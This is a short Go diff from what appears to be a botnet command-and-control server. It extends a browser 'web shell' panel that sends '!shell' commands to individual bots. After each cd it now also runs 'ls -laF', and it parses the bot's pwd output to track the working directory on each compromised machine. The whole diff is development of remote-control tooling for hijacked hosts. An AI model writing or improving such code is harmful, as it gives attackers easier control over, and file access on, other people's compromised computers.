@@ -87,8 +87,12 @@ func forwardBotOutputToWebShells(botID, output string) {
 	}
 	webShellPendingCdLock.Unlock()
 	if pending {
+		// Extract pwd from first line (output may contain ---LS--- marker + ls data after it)
 		resolved := strings.TrimSpace(output)
-		if strings.HasPrefix(resolved, "/") && !strings.Contains(resolved, "\n") {
+		if idx := strings.Index(resolved, "\n"); idx != -1 {
+			resolved = strings.TrimSpace(resolved[:idx])
+		}
+		if strings.HasPrefix(resolved, "/") {
 			webShellCwdLock.Lock()
 			webShellCwd[botID] = resolved
 			webShellCwdLock.Unlock()
@@ -190,12 +194,12 @@ func handleWebShellWS(w http.ResponseWriter, r *http.Request) {
 				webShellCwdLock.RLock()
 				cur := webShellCwd[botID]
 				webShellCwdLock.RUnlock()
-				// Let the shell resolve the real path via pwd, don't do string concat
+				// Let the shell resolve the real path via pwd, then list files
 				var cdCmd string
 				if cur != "" {
-					cdCmd = "cd " + shellQuote(cur) + " && cd " + shellQuote(dir) + " && pwd"
+					cdCmd = "cd " + shellQuote(cur) + " && cd " + shellQuote(dir) + " && pwd && echo '---LS---' && ls -laF"
 				} else {
-					cdCmd = "cd " + shellQuote(dir) + " && pwd"
+					cdCmd = "cd " + shellQuote(dir) + " && pwd && echo '---LS---' && ls -laF"
 				}
 				cmd = "!shell " + cdCmd
 				// Mark that we're waiting for pwd output to update cwd
